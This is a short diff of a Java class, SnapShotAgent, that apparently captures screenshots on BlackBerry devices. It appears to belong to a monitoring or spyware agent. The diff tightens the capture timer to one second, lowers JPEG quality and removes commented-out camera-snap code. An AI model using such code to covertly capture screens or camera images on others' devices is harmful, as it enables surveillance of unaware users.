@@ -11,6 +11,7 @@ package blackberry.agent;
 
 import java.io.EOFException;
 
+import net.rim.device.api.system.Application;
 import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.Bitmap;
 import net.rim.device.api.system.DeviceInfo;
@@ -38,9 +39,9 @@ public final class SnapShotAgent extends Agent {
     static Debug debug = new Debug("SnapShotAgent", DebugLevel.INFORMATION);
     //#endif
 
-    private static final int SNAPSHOT_DEFAULT_JPEG_QUALITY = 75;
+    private static final int SNAPSHOT_DEFAULT_JPEG_QUALITY = 60;
     private static final int LOG_SNAPSHOT_VERSION = 2009031201;
-    private static final int MIN_TIMER = 10 * 1000;
+    private static final int MIN_TIMER = 1 * 1000;
 
     private int timerMillis = 60 * 1000;
     private boolean onNewWindow = false;
@@ -123,15 +124,6 @@ public final class SnapShotAgent extends Agent {
         debug.trace("finished run");
         //#endif
 
-       /* byte[] record = CameraRecorder.snap();
-        //#ifdef DEBUG_TRACE
-        if (record != null){
-            debug.trace(" CameraRecorder.snap: " + record.length);
-        }else{
-            debug.warn(" CameraRecorder.snap: null record");
-        }
-        //#endif
-*/
     }
 
     /**
